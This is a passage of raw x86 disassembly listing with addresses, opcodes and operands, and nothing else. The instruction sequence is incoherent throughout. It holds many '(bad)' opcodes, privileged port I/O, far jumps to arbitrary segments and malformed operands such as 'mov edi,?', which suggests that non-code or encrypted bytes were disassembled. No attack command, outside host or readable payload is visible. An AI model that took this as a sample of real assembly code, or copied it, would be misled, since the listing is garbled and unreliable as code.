  4038d8:	imul   edx,DWORD PTR [esi+0x5e339b79],0x75
  4038df:	adc    ebx,DWORD PTR ss:[ebx-0x508c42a4]
  4038e6:	jmp    0xdac6:0x5448482e
  4038ed:	mov    ah,0x4
  4038ef:	dec    ebx
  4038f0:	test   al,0x7f
  4038f2:	mov    ds:0x29046a92,eax
  4038f7:	rcr    ebp,0x8d
  4038fa:	jle    0x4038d0
  4038fc:	outs   dx,BYTE PTR ds:[esi]
  4038fd:	es push 0x9185f6ca
  403903:	inc    esi
  403904:	fwait
  403905:	scas   eax,DWORD PTR es:[edi]
  403906:	xchg   ch,ah
  403908:	ret    
  403909:	sbb    esp,ebp
  40390b:	out    dx,al
  40390c:	or     DWORD PTR [ebp-0x7bc39f00],edi
  403912:	xor    eax,0x4f78efcc
  403917:	fwait
  403918:	xor    ebx,DWORD PTR [ecx+edi*1-0x6a]
  40391c:	pop    ebx
  40391d:	jbe    0x403968
  40391f:	dec    ebx
  403920:	(bad)  
  403921:	stc    
  403922:	pushf  
  403923:	fsubrp st(1),st
  403925:	jnp    0x40396d
  403927:	je     0x40393b
  403929:	inc    edx
  40392a:	inc    edi
  40392b:	out    dx,al
  40392c:	mov    esi,0x4339b2a7
  403931:	into   
  403932:	sti    
  403933:	lahf   
  403934:	jecxz  0x403927
  403936:	add    DWORD PTR [ecx+ebx*1],esp
  403939:	(bad)  
  40393a:	xlat   BYTE PTR ds:[ebx]
  40393b:	lahf   
  40393c:	adc    ah,dh
  40393e:	mov    dh,0xd4
  403940:	push   esi
  403941:	(bad)  
  403942:	out    dx,al
  403943:	popf   
  403944:	mov    ds:0x48ea33fd,eax
  403949:	iret   
  40394a:	xor    eax,0xd8249198
  40394f:	repnz and BYTE PTR [ecx-0x43],dh
  403953:	repz (bad) 
  403955:	ja     0x40394b
  403957:	clc    
  403958:	lods   eax,DWORD PTR ds:[esi]
  403959:	mov    ch,0xc3
  40395b:	ror    BYTE PTR [edx],1
  40395d:	jle    0x4038fb
  40395f:	scas   eax,DWORD PTR es:[edi]
  403960:	in     al,0xda
  403962:	mov    edx,0x695bea7f
  403967:	push   ecx
  403968:	pop    ecx
  403969:	mov    ebp,0x9bda120
  40396e:	in     al,0xc4
  403970:	sbb    dh,bh
  403972:	lock add al,0x5c
  403975:	or     BYTE PTR [ecx],cl
  403977:	sahf   
  403978:	scas   al,BYTE PTR es:[edi]
  403979:	push   esp
  40397a:	xor    DWORD PTR fs:[ecx+0x54a12710],ebp
  403981:	sub    al,0x5e
  403983:	or     eax,esp
  403985:	aaa    
  403986:	test   al,0xbe
  403988:	mov    bl,0x7
  40398a:	xchg   dh,cl
  40398c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40398d:	or     bl,BYTE PTR [ebx+0x1b4b58d5]
  403993:	mov    cl,0x1f
  403995:	xchg   ebx,eax
  403996:	or     eax,0xb0efbb34
  40399b:	xchg   DWORD PTR [edx+0x76],ebp
  40399e:	fisub  WORD PTR [edx-0x5a]
  4039a1:	call   0xe96d747b
  4039a6:	pop    ebx
  4039a7:	inc    ebp
  4039a8:	mov    ebx,esp
  4039aa:	sti    
  4039ab:	out    dx,al
  4039ac:	push   0x38
  4039ae:	out    0x79,al
  4039b0:	mov    ch,0x3e
  4039b2:	adc    BYTE PTR [ecx-0x4b61ba9e],al
  4039b8:	xlat   BYTE PTR ds:[ebx]
  4039b9:	arpl   WORD PTR [ebx],dx
  4039bb:	fild   WORD PTR [eax]
  4039bd:	fcom   QWORD PTR [ebp+0x14]
  4039c0:	sti    
  4039c1:	pop    ebp
  4039c2:	sub    ch,ch
  4039c4:	mov    eax,0xaabcec
  4039c9:	in     eax,0xaa
  4039cb:	test   al,0xed
  4039cd:	or     bh,BYTE PTR [edi]
  4039cf:	add    bh,ah
  4039d1:	sti    
  4039d2:	sbb    ah,BYTE PTR [edx+0x6d]
  4039d5:	mov    eax,ds:0xb1370e17
  4039da:	(bad)  
  4039db:	not    edi
  4039dd:	test   BYTE PTR [ebp-0x63f76764],0xee
  4039e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039e5:	std    
  4039e6:	fwait
  4039e7:	add    al,0x78
  4039e9:	aad    0x3
  4039eb:	int3   
  4039ec:	(bad)  
  4039ed:	sahf   
  4039ee:	jmp    0x403a44
  4039f0:	push   eax
  4039f1:	mov    ds:0x326dd8e0,eax
  4039f6:	mov    BYTE PTR [esi-0x27],bh
  4039f9:	addr16 xchg esi,eax
  4039fb:	lds    ecx,FWORD PTR [ecx+0x1e]
  4039fe:	leave  
  4039ff:	mov    ecx,0x2f9b269f
  403a04:	dec    eax
  403a05:	icebp  
  403a06:	aad    0xc2
  403a08:	push   ds
  403a09:	loop   0x403a85
  403a0b:	cli    
  403a0c:	and    eax,edx
  403a0e:	js     0x403a2f
  403a10:	les    eax,FWORD PTR [ecx+eiz*1-0x689b001]
  403a17:	stos   BYTE PTR es:[edi],al
  403a18:	push   ebx
  403a19:	inc    ebx
  403a1a:	scas   al,BYTE PTR es:[edi]
  403a1b:	popf   
  403a1c:	xchg   edx,eax
  403a1d:	sbb    DWORD PTR ss:0xca805ff5,esi
  403a24:	sbb    DWORD PTR ds:0x5a9ba555,edi
  403a2a:	mov    ebp,0xd8ede15b
  403a2f:	inc    ebp
  403a30:	nop
  403a31:	push   ss
  403a32:	mov    dh,0xc9
  403a34:	jmp    0x7e5dced6
  403a39:	nop
  403a3a:	jae    0x4039dc
  403a3c:	fadd   DWORD PTR [edi-0x4169d70e]
  403a42:	cdq    
  403a43:	cmp    DWORD PTR [ebp-0x44],edx
  403a46:	outs   dx,BYTE PTR ds:[esi]
  403a47:	adc    BYTE PTR [eax+0x79],al
  403a4a:	sbb    DWORD PTR [esi],esi
  403a4c:	mov    al,ds:0x8e2e5db7
  403a51:	xor    esi,DWORD PTR [edx]
  403a53:	addr16 push edi
  403a55:	hlt    
  403a56:	ss das 
  403a58:	(bad)  
  403a59:	aas    
  403a5a:	jo     0x403aa8
  403a5c:	pop    ebx
  403a5d:	cmp    DWORD PTR [edi-0x72],0xfffffffc
  403a61:	popf   
  403a62:	or     ebx,DWORD PTR [esi]
  403a64:	ror    esi,0x2a
  403a67:	mov    ds:0x1553b970,al
  403a6c:	hlt    
  403a6d:	imul   esp,DWORD PTR [edx+0x6fad8e04],0x12e412d2
  403a77:	push   eax
  403a78:	stos   BYTE PTR es:[edi],al
  403a79:	icebp  
  403a7a:	repnz mov ch,0xbf
  403a7d:	jg     0x403ad0
  403a7f:	and    ebp,DWORD PTR [esi]
  403a81:	repnz sbb al,0x89
  403a84:	jg     0x403ad7
  403a86:	loopne 0x403aa0
  403a88:	(bad)  
  403a89:	cmp    al,0x7e
  403a8b:	jg     0x403a3d
  403a8d:	imul   ecx,DWORD PTR [eax-0x48],0x32
  403a91:	pop    edi
  403a92:	shl    DWORD PTR [ebp+0x70103eb2],cl
  403a98:	sub    edi,edi
  403a9a:	mov    cl,0x89
  403a9c:	fs call ebx
  403a9f:	fisubr WORD PTR [esi+ebp*4+0x696952f]
  403aa6:	xchg   DWORD PTR [ebp+ebp*8-0x7a],edi
  403aaa:	shr    DWORD PTR [edx+0x2],0x4b
  403aae:	xor    cl,dl
  403ab0:	imul   eax,DWORD PTR [ebp-0x73],0x1b
  403ab4:	push   0x19
  403ab6:	data16 cmp ch,BYTE PTR [edx-0x42]
  403aba:	out    0x89,eax
  403abc:	cwde   
  403abd:	stos   BYTE PTR es:[edi],al
  403abe:	push   ss
  403abf:	test   al,0x77
  403ac1:	xor    esp,DWORD PTR [ecx-0x4084a341]
  403ac7:	hlt    
  403ac8:	ins    BYTE PTR es:[edi],dx
  403ac9:	pop    eax
  403aca:	dec    edx
  403acb:	das    
  403acc:	orps   xmm6,xmm5
  403acf:	jp     0x403af4
  403ad1:	xchg   ecx,eax
  403ad2:	add    DWORD PTR [ebx],ecx
  403ad4:	or     eax,ebp
  403ad6:	test   eax,0xe23a5035
  403adb:	test   eax,0xe070b961
  403ae0:	lea    ecx,[ebp-0xd629945]
  403ae6:	push   es
  403ae7:	test   DWORD PTR [ebp-0x5c],ecx
  403aea:	ror    DWORD PTR [eax],0x85
  403aed:	sbb    eax,0x4a89abdf
  403af2:	movsx  esi,WORD PTR [esi+0x5c]
  403af6:	cmp    BYTE PTR [ebp+0x42],dh
  403af9:	xor    edx,DWORD PTR [esi+0x56]
  403afc:	sbb    ah,BYTE PTR [ecx]
  403afe:	das    
  403aff:	js     0x403a8e
  403b01:	cmp    DWORD PTR [ecx+0x6f],ecx
  403b04:	popf   
  403b05:	retf   
  403b06:	or     eax,0x498dd738
  403b0b:	sti    
  403b0c:	ret    0x3d16
  403b0f:	dec    ebp
  403b10:	retf   0x85fe
  403b13:	pop    ebx
  403b14:	and    eax,DWORD PTR [edx+0x53]
  403b17:	jg     0x403b84
  403b19:	pop    esi
  403b1a:	inc    edi
  403b1b:	or     dl,bh
  403b1d:	dec    edx
  403b1e:	stc    
  403b1f:	push   cs
  403b20:	sbb    DWORD PTR [ebx+ebx*8-0x1b],0xffffff88
  403b25:	into   
  403b26:	or     al,0x3f
  403b28:	xlat   BYTE PTR ds:[ebx]
  403b29:	fcom   QWORD PTR [eax]
  403b2b:	mov    esi,0xdc1f445f
  403b30:	and    al,0x78
  403b32:	sub    eax,0xbd8b5d80
  403b37:	mov    ds:0x5b81ab6b,al
  403b3c:	inc    ebx
  403b3d:	dec    esi
  403b3e:	mov    al,0xb7
  403b40:	mov    al,0x99
  403b42:	adc    BYTE PTR [ebx-0x12f50d41],ah
  403b48:	jmp    0x98f0c12a
  403b4d:	imul   esi,edi,0x1e1cba3f
  403b53:	pop    esi
  403b54:	sbb    al,0x1d
  403b56:	sub    esi,DWORD PTR [ecx]
  403b58:	(bad)  
  403b5a:	or     dh,BYTE PTR [ecx-0x26793dab]
  403b60:	int3   
  403b61:	mov    ds:0x1b10b91f,eax
  403b66:	out    0x6f,al
  403b68:	dec    ecx
  403b69:	and    DWORD PTR [ecx-0x1],ebp
  403b6c:	fwait
  403b6d:	push   ds
  403b6e:	test   BYTE PTR cs:[esp+edi*8+0x4e],bl
  403b73:	(bad)  
  403b74:	int    0xda
  403b76:	retf   
  403b77:	aas    
  403b78:	sub    DWORD PTR [esp+ecx*8+0x237da2b1],edi
  403b7f:	sti    
  403b80:	repnz (bad) 
  403b82:	cmc    
  403b83:	int3   
  403b84:	in     al,0x1f
  403b86:	xlat   BYTE PTR ds:[ebx]
  403b87:	mov    esi,0x849aea2c
  403b8c:	in     al,dx
  403b8d:	jno    0x403b56
  403b8f:	sub    al,0x1c
  403b91:	mov    cl,0x30
  403b93:	stc    
  403b94:	jp     0x403b16
  403b96:	jb     0x403bf6
  403b98:	(bad)  
  403b99:	das    
  403b9a:	fimul  WORD PTR [edi+edi*4-0x3e]
  403b9e:	cmp    eax,0xdd923969
  403ba3:	enter  0xc5c8,0xf3
  403ba7:	and    eax,0x7fadc8e7
  403bac:	dec    ecx
  403bad:	js     0x403be3
  403baf:	(bad)  
  403bb0:	in     eax,dx
  403bb1:	mov    ds:0x8f40a45b,al
  403bb6:	loopne 0x403b45
  403bb8:	add    ch,BYTE PTR [edi]
  403bba:	push   ecx
  403bbb:	mov    esi,0xcc1af0
  403bc0:	and    al,0xb6
  403bc2:	imul   BYTE PTR [ebp-0x521a83df]
  403bc8:	mov    al,ds:0x11d34d93
  403bcd:	xchg   ebp,ebx
  403bcf:	sti    
  403bd0:	out    0x10,al
  403bd2:	enter  0x6fb5,0x57
  403bd6:	loopne 0x403b8d
  403bd8:	dec    edx
  403bd9:	popa   
  403bda:	mov    esp,0xd712ef99
  403bdf:	ins    BYTE PTR es:[edi],dx
  403be0:	(bad)  
  403be1:	sub    al,0x44
  403be3:	push   edx
  403be4:	lods   eax,DWORD PTR ds:[esi]
  403be5:	std    
  403be6:	push   eax
  403be7:	push   ds
  403be8:	mov    ch,0x8e
  403bea:	outs   dx,BYTE PTR ds:[esi]
  403beb:	adc    BYTE PTR [edi+0x5d],dl
  403bee:	cmp    BYTE PTR ds:0xb3e5480d,dl
  403bf4:	push   0x20
  403bf6:	pop    eax
  403bf7:	and    edx,edx
  403bf9:	push   ebx
  403bfa:	fwait
  403bfb:	jns    0x403be0
  403bfd:	hlt    
  403bfe:	sbb    al,0xa5
  403c00:	ds mov ebx,edi
  403c03:	mov    eax,edx
  403c05:	cdq    
  403c06:	adc    ch,BYTE PTR [esi+0x5c]
  403c09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c0b:	inc    esp
  403c0c:	sar    DWORD PTR [esi-0x6b],0xe7
  403c10:	mov    edi,0x2367d16e
  403c15:	mov    edx,DWORD PTR ds:0x8c20baa9
  403c1b:	add    DWORD PTR [ecx-0xe7f2736],0xa5898e99
  403c25:	push   edi
  403c26:	add    ah,BYTE PTR [edx+0x51]
  403c29:	sar    BYTE PTR [edx-0x65],cl
  403c2c:	arpl   WORD PTR [ebx+0x3b],ax
  403c2f:	(bad)  
  403c30:	lahf   
  403c31:	jne    0x403ca0
  403c33:	fisub  DWORD PTR [ebx]
  403c35:	inc    esp
  403c36:	and    eax,0x4791424b
  403c3b:	lods   eax,DWORD PTR ds:[esi]
  403c3c:	sbb    dl,BYTE PTR [edx+0x15eedbe9]
  403c42:	arpl   WORD PTR [ebx],bp
  403c44:	push   ss
  403c45:	cmc    
  403c46:	push   ebp
  403c47:	rol    DWORD PTR [ebp-0x3b],1
  403c4a:	leave  
  403c4b:	mov    al,0xc0
  403c4d:	lea    esp,[edx]
  403c4f:	add    BYTE PTR [edx+0x2a],cl
  403c52:	dec    edx
  403c53:	daa    
  403c54:	jmp    0x551a00d8
  403c59:	xchg   edx,eax
  403c5a:	pop    es
  403c5b:	(bad)  
  403c5d:	jge    0x403c1c
  403c5f:	pop    ecx
  403c60:	ret    
  403c61:	fisub  DWORD PTR ss:[esi-0x60]
  403c65:	sbb    edx,DWORD PTR [eax]
  403c67:	aad    0xbb
  403c69:	xchg   esp,eax
  403c6a:	inc    ebp
  403c6b:	out    dx,eax
  403c6c:	sbb    bh,BYTE PTR [edi]
  403c6e:	adc    esp,DWORD PTR [ecx-0x4881cd05]
  403c74:	dec    ecx
  403c75:	sub    DWORD PTR [ebx+0x17a1fcf],0x52
  403c7c:	and    bh,BYTE PTR [ebx+ebx*8-0x43f91b1d]
  403c83:	add    DWORD PTR [ecx+0x4],edx
  403c86:	(bad)  
  403c87:	sub    DWORD PTR [edi],ebp
  403c89:	out    0x7a,eax
  403c8b:	xchg   ecx,eax
  403c8c:	rdtsc  
  403c8e:	fcom   DWORD PTR [ecx]
  403c90:	inc    ebx
  403c91:	add    BYTE PTR es:[ebx],cl
  403c94:	fisub  WORD PTR ds:0x31da0b33
  403c9a:	push   ecx
  403c9b:	sbb    dh,BYTE PTR [ecx+0x74]
  403c9e:	(bad)  
  403c9f:	jmp    0x18577af3
  403ca4:	retf   0xbc7f
  403ca7:	repnz adc dl,ch
  403caa:	push   cs
  403cab:	dec    ecx
  403cac:	cwde   
  403cad:	pop    ecx
  403cae:	cmp    eax,0xd3d05621
  403cb3:	inc    ecx
  403cb4:	pop    ecx
  403cb5:	fs mov bl,0xcc
  403cb8:	inc    ebp
  403cb9:	jecxz  0x403cc8
  403cbb:	aas    
  403cbc:	mov    DWORD PTR [ecx-0x4d05e7cf],eax
  403cc2:	loope  0x403d36
  403cc4:	or     eax,0xae6acf53
  403cc9:	sbb    BYTE PTR [ecx-0x340006b0],ch
  403ccf:	lahf   
  403cd0:	test   al,0x74
  403cd2:	test   edi,0x85768026
  403cd8:	das    
  403cd9:	mov    DWORD PTR [edi],eax
  403cdb:	ins    BYTE PTR es:[edi],dx
  403cdc:	repnz out dx,al
  403cde:	mov    dl,0x92
  403ce0:	int    0x4d
  403ce2:	cmp    eax,0x4ccb5a7b
  403ce7:	daa    
  403ce8:	inc    eax
  403ce9:	mov    edi,?
  403ceb:	inc    edx
  403cec:	std    
  403ced:	pop    es
  403cee:	ficom  DWORD PTR [esi]
  403cf0:	mov    eax,0x9fff694d
  403cf5:	and    al,0xca
  403cf7:	or     bl,bl
  403cf9:	ss add al,0xba
  403cfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cfd:	mov    dl,0x6b
  403cff:	fist   WORD PTR [ecx+0x53]
  403d02:	mov    eax,ds:0x868f2b
  403d07:	dec    edi
  403d08:	push   ecx
  403d09:	pusha  
  403d0a:	out    0x88,al
  403d0c:	ret    0xba3
  403d0f:	xlat   BYTE PTR ds:[ebx]
  403d10:	pusha  
  403d11:	nop
  403d12:	or     al,BYTE PTR [edx]
  403d14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d15:	mov    dl,0x54
  403d17:	mov    gs,WORD PTR [ebx+0x46]
  403d1a:	je     0x403d78
  403d1c:	imul   esi,esi,0xffffffff
  403d1f:	adc    bh,BYTE PTR [edi-0x66]
  403d22:	inc    ebx
  403d23:	add    eax,DWORD PTR [esi]
  403d25:	bound  esi,QWORD PTR [ebp+ecx*8+0x44]
  403d29:	xchg   esi,eax
  403d2a:	and    eax,0x383dd3a7
  403d2f:	das    
  403d30:	mov    edx,0xc577f235
  403d35:	popf   
  403d36:	jmp    0x9cbf:0x816aecd4
  403d3d:	sar    DWORD PTR [eax],cl
  403d3f:	xor    dl,ah
  403d41:	test   BYTE PTR [ebx+0x62dc4567],0x3f
  403d48:	aam    0xd7
  403d4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d4b:	ins    BYTE PTR es:[edi],dx
  403d4c:	jbe    0x403d80
  403d4e:	fild   QWORD PTR [ebx+eax*2+0x330241ed]
  403d55:	lods   eax,DWORD PTR ds:[esi]
  403d56:	in     eax,0x2c
  403d58:	sar    dl,cl
  403d5a:	cdq    
  403d5b:	test   DWORD PTR [esi-0x2c],esp
  403d5e:	mov    gs,WORD PTR [edi+0x7f]
  403d61:	cmp    al,0x1f
  403d63:	add    esp,DWORD PTR [ebp+0x62681972]
  403d69:	bound  ecx,QWORD PTR [esi+edx*8-0x6a]
  403d6d:	(bad)  
  403d6f:	add    al,ah
  403d71:	ret    0x7437
  403d74:	jb     0x403d47
  403d76:	bnd jmp 0x403d3e
  403d79:	push   edx
  403d7a:	add    al,0xe3
  403d7c:	imul   DWORD PTR [eax]
  403d7e:	mov    DWORD PTR [ecx-0x57],ecx
  403d81:	push   0xffffffbb
  403d83:	adc    bh,bh
  403d85:	sbb    edi,DWORD PTR fs:[ecx-0x75]
  403d89:	xchg   DWORD PTR [ebp-0x37e77269],edi
  403d8f:	push   eax
  403d90:	inc    ebp
  403d91:	or     DWORD PTR [edx-0x24],esi
  403d94:	mov    fs,WORD PTR [esi-0x2d531a]
  403d9a:	fisub  DWORD PTR [ebp+0xb9c855e]
  403da0:	mov    edi,0xfc9b51b8
  403da5:	add    eax,0xd29ecf12
  403daa:	cmp    bh,BYTE PTR [ecx-0x368dbf7d]
  403db0:	ja     0x403e31
  403db2:	cmp    al,0x43
  403db4:	sbb    ch,ah
  403db6:	call   0x1abc:0xf6aca0fa
  403dbd:	sub    esi,DWORD PTR [eax+eax*2]
  403dc0:	lock adc eax,0x21b5da58
  403dc6:	je     0x403e46
  403dc8:	inc    edi
  403dc9:	push   0x7d
  403dcb:	enter  0x8786,0xf6
  403dcf:	xor    eax,0x53819b99
  403dd4:	or     al,0x9f
  403dd6:	xchg   edi,eax
  403dd7:	inc    al
  403dd9:	dec    edx
  403dda:	rcr    ebx,0x84
  403ddd:	mov    ebp,0x6a3629a3
  403de2:	xchg   DWORD PTR [edi],edi
  403de4:	std    
  403de5:	xor    BYTE PTR [eax],ch
  403de7:	jnp    0x403db5
  403de9:	or     DWORD PTR [ebx-0x7],eax
  403dec:	mov    esi,0x6cbc19f5
  403df1:	mov    edi,DWORD PTR [ecx-0x1a]
  403df4:	and    BYTE PTR [eax+eax*8+0x5262ce0c],al
  403dfb:	jbe    0x403e33
  403dfd:	dec    ecx
  403dfe:	enter  0x3d2f,0x7a
  403e02:	jmp    0x403e1a
  403e04:	mov    ss,WORD PTR ds:[eax]
  403e07:	xchg   edx,eax
  403e08:	dec    esi
  403e09:	or     edx,DWORD PTR [eax-0x61a367a7]
  403e0f:	fsub   DWORD PTR [esi-0x5d861e39]
  403e15:	adc    eax,0xe008e835
  403e1a:	sti    
  403e1b:	add    al,0xf8
  403e1d:	inc    esp
  403e1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e1f:	loop   0x403db4
  403e21:	lahf   
  403e22:	ret    
  403e23:	dec    edx
  403e24:	clc    
  403e25:	jno    0x403e1b
  403e27:	loop   0x403e79
  403e29:	sbb    dh,dh
  403e2b:	add    BYTE PTR [edi],cl
  403e2d:	rcl    cl,cl
  403e2f:	and    ah,BYTE PTR [ecx+0x73]
  403e32:	stc    
  403e33:	cmp    cl,BYTE PTR [esi+0x7fb702d9]
  403e39:	enter  0x7620,0x7b
  403e3d:	shl    DWORD PTR [ecx-0x4f1b0b8e],cl
  403e43:	xlat   BYTE PTR ds:[ebx]
  403e44:	or     DWORD PTR [esi],ebp
  403e46:	sbb    al,0xa9
  403e48:	push   edi
  403e49:	cmp    eax,0x51409946
  403e4e:	or     eax,0xc7a7e4dd
  403e53:	inc    ecx
  403e54:	test   BYTE PTR [edx],dl
  403e56:	sub    al,cl
  403e58:	jle    0x403e20
  403e5a:	lods   eax,DWORD PTR ds:[esi]
  403e5b:	retf   0x434c
  403e5e:	fmul   DWORD PTR [edx+0x15433403]
  403e64:	mov    ebp,0xa7e58596
  403e69:	das    
  403e6a:	adc    edi,ebx
  403e6c:	cwd    
  403e6e:	icebp  
  403e6f:	pop    esi
  403e70:	adc    eax,DWORD PTR [ebp-0x5d]
  403e73:	pushf  
  403e74:	jle    0x403e23
  403e76:	nop
  403e77:	xchg   ebx,eax
  403e78:	and    eax,DWORD PTR [edx]
  403e7a:	pop    edi
  403e7b:	jl     0x403e7c
  403e7d:	add    BYTE PTR [edx-0x3f697f01],al
  403e83:	push   0xffffffd6
  403e85:	faddp  st(1),st
  403e87:	test   al,0xee
  403e89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e8a:	mov    esp,0xfc79c9ec
  403e8f:	sub    al,0x93
  403e91:	cli    
  403e92:	inc    esp
  403e93:	push   esp
  403e94:	mov    edx,0xe66277e3
  403e99:	pop    ds
  403e9a:	mov    ds:0x139d8688,eax
  403e9f:	js     0x403ea1
  403ea1:	mov    fs:0x531fc38d,eax
  403ea7:	clc    
  403ea8:	jl     0x403eb9
  403eaa:	(bad)  
  403eab:	inc    eax
  403eac:	in     eax,0x63
  403eae:	adc    al,0x5d
  403eb0:	jmp    0xe0c2a3cc
  403eb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403eb6:	ret    0x231a
  403eb9:	stos   BYTE PTR es:[edi],al
  403eba:	ins    DWORD PTR es:[edi],dx
  403ebb:	jmp    0xf01e:0xaea7e711
  403ec2:	push   0x16bf048a
  403ec7:	push   cs
  403ec8:	loop   0x403e8e
  403eca:	mov    cl,0xb7
  403ecc:	(bad)  
  403ecd:	inc    edx
  403ece:	pop    esi
  403ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ed0:	fsubr  DWORD PTR [edx-0x29]
  403ed3:	xchg   DWORD PTR [edx-0x36ffab5],ecx
  403ed9:	(bad)  
  403eda:	fst    DWORD PTR [esi-0x4c44f5a2]
  403ee0:	out    dx,eax
  403ee1:	jle    0x403ea4
  403ee3:	lds    edi,FWORD PTR [esi+ecx*2-0x2f703b7c]
  403eea:	sbb    ecx,ebp
  403eec:	into   
  403eed:	outs   dx,DWORD PTR ds:[esi]
  403eee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403eef:	sub    al,0xbf
  403ef1:	(bad)  
  403ef2:	fcomp  QWORD PTR [ebp-0x493512f5]
  403ef8:	xor    al,0xf3
  403efa:	daa    
  403efb:	fwait
  403efc:	sbb    DWORD PTR [edx+0x34240328],esi
  403f02:	clc    
  403f03:	sbb    DWORD PTR [esi-0x52],0xa32227c9
  403f0a:	sub    DWORD PTR [ecx+0x14],esp
  403f0d:	cvtps2pd xmm4,QWORD PTR [eax]
  403f10:	lds    ecx,FWORD PTR [ecx]
  403f12:	xchg   esi,eax
  403f13:	stc    
  403f14:	test   DWORD PTR [ebx+0x47],ebx
  403f17:	addr16 popa 
  403f19:	pop    edx
  403f1a:	int3   
  403f1b:	xchg   ebp,eax
  403f1c:	lds    ebp,FWORD PTR [ebx]
  403f1e:	jmp    0x403f46
  403f20:	push   eax
  403f21:	xchg   BYTE PTR [ecx-0xdc664f7],dh
  403f27:	xor    dh,BYTE PTR [edi-0x47]
  403f2a:	push   ds
  403f2b:	push   DWORD PTR [eax]
  403f2d:	dec    esi
  403f2e:	mov    ch,0x69
  403f30:	(bad)  
  403f31:	(bad)  
  403f32:	call   0x7d34efb0
  403f37:	cdq    
  403f38:	fst    st(7)
  403f3a:	fsubr  st,st(6)
  403f3c:	add    ebp,DWORD PTR [ebx+0x6f]
  403f3f:	jbe    0x403ef1
  403f41:	aaa    
  403f42:	pop    ds
  403f43:	mov    ds:0x8732efb1,al
  403f48:	out    0x1c,eax
  403f4a:	dec    esi
  403f4b:	test   eax,0x7bf7fae3
  403f50:	pop    ss
  403f51:	cli    
  403f52:	xchg   edi,eax
  403f53:	mov    ah,BYTE PTR [edi-0x9]
  403f56:	fstp   TBYTE PTR [eax-0x5d]
  403f59:	stos   DWORD PTR es:[edi],eax
  403f5a:	pop    ecx
  403f5b:	mov    esi,0x6779dceb
  403f60:	adc    al,0x29
  403f62:	push   0x5d631e3b
  403f67:	outs   dx,DWORD PTR ds:[esi]
  403f68:	test   eax,0xfecdb395
  403f6d:	ficom  WORD PTR [ebp-0x4e]
  403f70:	mov    edi,0xe4342dfa
  403f75:	pusha  
  403f76:	mov    edi,0x6cfb7d8b
  403f7b:	(bad)  
  403f7c:	or     ebx,DWORD PTR [edi-0x6db25b0b]
  403f82:	push   esi
  403f83:	mov    ecx,0x4f6bcc6e
  403f88:	nop
  403f89:	mov    ah,0xf1
  403f8b:	adc    BYTE PTR [ebx],al
  403f8d:	mov    edi,0xdce81e49
  403f92:	fldcw  WORD PTR [esi]
  403f94:	jae    0x403f41
  403f96:	sub    ah,ch
  403f98:	lahf   
  403f99:	mov    bh,BYTE PTR [eax-0x837e61d]
  403f9f:	cmp    cl,BYTE PTR [edx]
  403fa1:	(bad)
  403fa5:	mov    ebx,0x4b3ed8c9
  403faa:	mov    eax,0x7b5762da
  403faf:	sar    al,cl
  403fb1:	sbb    al,0x92
  403fb3:	pop    esi
  403fb4:	or     DWORD PTR [edi+ebp*2],esi
  403fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fb8:	add    DWORD PTR [ecx+0x4f571d01],ebp
  403fbe:	push   0x61
  403fc0:	loop   0x403fcf
  403fc2:	mov    ebp,0x3d78eee3
  403fc7:	pop    ecx
  403fc8:	cmc    
  403fc9:	fcom   st(5)
  403fcb:	ds fs xor eax,0x8ddebbdf
  403fd2:	adc    bh,BYTE PTR [ebp-0x7e752b67]
  403fd8:	(bad)  
  403fd9:	repnz dec esi
  403fdb:	push   ss
  403fdc:	mov    DWORD PTR [edi],edi
  403fde:	inc    edi
  403fdf:	xchg   dh,al
  403fe1:	pop    edx
  403fe2:	mov    ?,WORD PTR [ebx-0x3284fc5b]
  403fe8:	shr    DWORD PTR [esi+0x56],0x28
  403fec:	jbe    0x403fc8
  403fee:	sbb    DWORD PTR [ebp-0x68],ebx
  403ff1:	push   ds
  403ff2:	mov    dl,0xe7
  403ff4:	inc    ebx
  403ff5:	add    eax,0x44c7de29
  403ffa:	sbb    DWORD PTR [eax-0x40e4f7b2],esp
  404000:	mov    eax,ds:0x192a046c
  404005:	and    BYTE PTR ds:[edi],dl
  404008:	in     al,0x21
  40400a:	sub    DWORD PTR [ecx+0x79],0x73
  40400e:	or     eax,0xca4c08a4
  404013:	xor    eax,DWORD PTR [edi]
  404015:	das    
  404016:	ja     0x404049
  404018:	adc    DWORD PTR [esi-0xe],edx
  40401b:	xor    DWORD PTR [esi],eax
  40401d:	sbb    eax,0x3f197186
  404022:	jmp    0x51ac:0x5577e967
  404029:	jns    0x404049
  40402b:	cmp    DWORD PTR [esi],edi
  40402d:	add    al,0x3f
  40402f:	scas   eax,DWORD PTR es:[edi]
  404030:	mov    dl,0xac
  404032:	add    dh,BYTE PTR [edx]
  404034:	sbb    DWORD PTR [eax+esi*2+0x63],ebp
  404038:	mov    esi,0x6ba9cc10
  40403d:	and    eax,0xa3df7683
  404042:	pusha  
  404043:	fcomp  DWORD PTR [ebx-0x41]
  404046:	jecxz  0x40408b
  404048:	jns    0x40403e
  40404a:	jns    0x4040c5
  40404c:	mov    ah,0x1b
  40404e:	data16 cmp al,BYTE PTR [esp+esi*1-0x525410fa]
  404056:	sbb    DWORD PTR [edi+0x7c],0xbeba3924
  40405d:	jle    0x403ff6
  40405f:	push   ebx
  404060:	sbb    bh,0x4
  404063:	add    DWORD PTR [edi+0x3e1ca887],0x21b8e0bf
  40406d:	aam    0xb9
  40406f:	adc    ecx,DWORD PTR [esi+0x13]
  404072:	push   DWORD PTR [ebx]
  404074:	jl     0x4040a8
  404076:	or     BYTE PTR [eax+0x725f1a6],0xfb
  40407d:	out    0xf8,eax
  40407f:	or     edx,DWORD PTR [esi+0x4a66da]
  404085:	js     0x40407d
  404087:	jge    0x40403d
  404089:	inc    eax
  40408a:	sub    DWORD PTR [ebx],esi
